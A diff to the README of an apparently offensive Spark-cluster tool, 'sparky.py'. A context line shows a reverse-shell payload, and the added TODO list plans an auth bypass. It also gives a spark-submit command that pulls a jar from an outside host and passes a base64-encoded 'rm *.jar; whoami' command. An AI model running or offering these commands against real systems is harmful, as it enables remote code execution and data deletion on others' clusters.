@@ -196,3 +196,10 @@ ayoul3@lab:~/$ python sparky.py 192.168.1.30 192.168.1.22 -c "bash -i >& /dev/tc
 [+] Positive response from the Master
 [*] If cmd failed, adjust the -m param to make sure to case an out of memory error
 ```
+
+
+### TODO
+- Add the possibility to submit a job in cluster mode (easy)
+- Attempt auth bypass with submitDriver case class (maybe)
+```spark-submit --deploy-mode cluster --master spark://192.168.1.37:7077 --conf "spark.app.name=ML xp" --conf "spark.local.ip=192.168.1.22" --conf "spark.driver.host=192.168.1.22" --conf "spark.master=spark://192.168.1.37:7077" --conf "spark.driver.extraJavaOptions=-Duser.name=lambda" --class SimpleApp http://192.168.1.22:6666/SimpleApp.jar "cm0gKi5qYXIgMj4gL2Rldi9udWxsOyB3aG9hbWk=" 1```
+- Fingerprint Spark version (maybe)
